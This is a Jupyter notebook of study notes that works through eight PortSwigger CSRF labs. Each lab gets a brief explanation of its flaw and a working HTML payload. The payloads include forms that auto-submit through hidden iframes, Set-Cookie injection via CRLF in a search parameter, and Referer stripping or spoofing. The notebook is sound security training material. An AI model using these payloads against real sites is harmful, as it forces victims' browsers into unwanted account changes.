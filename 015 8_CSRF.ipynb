{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                            # Cross Site Request Forgery CSRF                               "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> labs:  \n",
    "   - https://portswigger.net/web-security/csrf\n",
    "   \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=j4XnbHRcMZk&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=23\n",
    "   - https://www.youtube.com/watch?v=QC7fkCUZDp8&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=24\n",
    "   \n",
    ">> Rana Khalil:\n",
    "   - https://www.youtube.com/playlist?list=PLuyTk2_mYISKNFqao_NBzYOWvJFqhVmXN"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">> What is CSRF?\n",
    "   - Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.\n",
    "   \n",
    ">> The payloads are\n",
    "```html\n",
    "    <html>\n",
    "      <body>\n",
    "        <h1>Hello</h1>\n",
    "        <iframe style=\"display:none\" name=\"csrf-iframe\"></iframe>\n",
    "        <form action=\"https://YOUR-Lab-ID.web-security-academy.net/my-account/change-email\" method=\"POST\" target=\"csrf-iframe\" id=\"csrf-form\">\n",
    "          <input type=\"hidden\" name=\"email\" value=\"Wee@Wee.com\">\n",
    "        </form>\n",
    "        <script> document.getElementById(\"csrf-frame\").submit() </script>\n",
    "      </body>\n",
    "    </html>\n",
    "```\n",
    "``` html\n",
    "    <html>\n",
    "     <body>\n",
    "       <h1>Hello</h1>\n",
    "       <img src=\"https://YOUR-Lab-ID.web-security-academy.net/my-account/change-email\" width=\"0\" height=\"0\" border=\"0\">\n",
    "     </body>\n",
    "    </html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# lab-1: CSRF vulnerability with no defenses:\n",
    "\n",
    "- Copy the Change email Code from the page source\n",
    "- craft your payload to send the request of changing the mail\n",
    "- the payload is:\n",
    "```html\n",
    "<form action=\"https://YOUR-Lab-ID.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "</form>         \n",
    "<script>       \n",
    "           document.forms[0].submit();\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: CSRF where token validation depends on request method:\n",
    "\n",
    "- The Validation is performed on the POST method only if the Token is exist or not\n",
    "- Change the Request Method to GET will not validate on the Token any more\n",
    "- Change the Method of Changing email request and send the payload \n",
    "```html\n",
    "<form action=\"https://YOUR-Lab-ID.web-security-academy.net/my-account/change-email\" method=\"GET\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "</form>\n",
    "<script>\n",
    "            document.forms[0].submit();\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: CSRF where token validation depends on token being present:\n",
    "\n",
    "- The Validation is performed on the existance of the CSRF_Token\n",
    "- if you delete it, the Request will pass with no errors\n",
    "- The payload is \n",
    "```html\n",
    "<form action=\"https://YOUR-Lab-ID.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "</form>\n",
    "<script>\n",
    "            document.forms[0].submit();\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: CSRF where token is not tied to user session:\n",
    "\n",
    "- The Token is not constant, changes continuously with any refresh or request\n",
    "- The Solution Here is that you can use other user CSRF_Token to change other accounts data\n",
    "- You need to open the Carlos account and take the CSRF_Token from it and make the exploit \n",
    "- the Payload is\n",
    "```html\n",
    "<form action=\"https://0a0600a40406805380d40327001f0030.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "            <!-- The CSRF_Token here is from Carlos account to change the mail of wiener -->\n",
    "            <input required=\"\" type=\"hidden\" name=\"csrf\" value=\"2KYXmKJDQASWD4HlUDod3Od0Apg8CM94\"> \n",
    "</form>\n",
    "<script>\n",
    "            document.forms[0].submit();\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: CSRF Where token is tied to non-session cookie:\n",
    "\n",
    "- The Token and The Token-Key are tied together with relationship\n",
    "- You can't change the Token only or the Token-key only\n",
    "- The Last search functionality on the search page is used to change the CSRF_Key\n",
    "- The Idea is that you can change the Token and the Token-key together with corolated ones\n",
    "- So you need to take the Carlos CSRF_Token and CSRF_Key and make a request with them to change the Wiener mail \n",
    "- The payload is\n",
    "```html\n",
    "<!-- The img tag for making a request to change the CSRF_Key on the Browser -->\n",
    "<img src=\"https://Your_Lab_ID.web-security-academy.net/?search=%0d%0aSet-Cookie:+csrfKey=pTvzCHVasuTPDiQmLNYODO4rMTtqEzLY%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\">\n",
    "<!-- The Form tag for changing the CSRF_Token -->\n",
    "<form action=\"https://Your_Lab_ID.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "            <input required=\"\" type=\"hidden\" name=\"csrf\" value=\"rz0reAb19h0upjPkt8cWqQWfzQ4tzm2B\"> \n",
    "</form>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-6: CSRF when token is duplicated in cookie:\n",
    "\n",
    "- The Idea of the Lab that the 2 CSRF are the same values \n",
    "- The Last search functionality on the search page used to change the CSRF\n",
    "- The Payload is\n",
    "```html\n",
    "<!-- The img tag for making a request to change the CSRF_Token on the Browser -->\n",
    "<img src=\"https://Your_Lab_ID.web-security-academy.net/?search=%0d%0aSet-Cookie:+csrf=Test%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\">\n",
    "<!-- The Form tag for changing the CSRF_Token -->\n",
    "<form action=\"https://Your_Lab_ID.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "            <input required=\"\" type=\"hidden\" name=\"csrf\" value=\"Test\"> \n",
    "</form>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-7: CSRF where Referer validation depends on header being present:\n",
    "\n",
    "- The Server validate on the Referre header if exist, or is changed, or not\n",
    "- we delete the Referer header and send the request\n",
    "- The payload is \n",
    "\n",
    "``` HTML\n",
    "<html>\n",
    "  <head> <meta name=\"referrer\" content=\"no-referrer\"> </head>\n",
    "  <body>\n",
    "    <iframe style=\"displaying:none\" name=\"csrf-iframe\"></iframe>\n",
    "    <form action=\"https://0ac4001e0435992281e1b6d200450010.web-security-academy.net/my-account/change-email\" method=\"POST\" id=\"csrf-form\" target=\"csrf-iframe\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "    </form>\n",
    "    <script>document.getElementById(\"csrf-form\").submit()</script>\n",
    "  </body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-8: CSRF with broken Referer validation:\n",
    "\n",
    "- The Server validate on the Referrer header is exist or changed\n",
    "- so adding the history.pushState to add the lab url to the Referrer header\n",
    "- The payload is:\n",
    "```html\n",
    "<html>\n",
    "  <body>\n",
    "    <script>history.pushState('', '' , '/?https://0a8b006c03f54c0e827d4c5f00b70089.web-security-academy.net/my-account')</script>\n",
    "    <iframe style=\"displaying:none\" name=\"csrf-iframe\"></iframe>\n",
    "    <form action=\"https://0a8b006c03f54c0e827d4c5f00b70089.web-security-academy.net/my-account/change-email\" method=\"POST\" id=\"csrf-form\" target=\"csrf-iframe\">\n",
    "           <input type=\"hidden\" name=\"email\" value=\"weee@wee.com\">\n",
    "    </form>\n",
    "    <script>document.getElementById(\"csrf-form\").submit()</script>\n",
    "  </body>\n",
    "</html>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
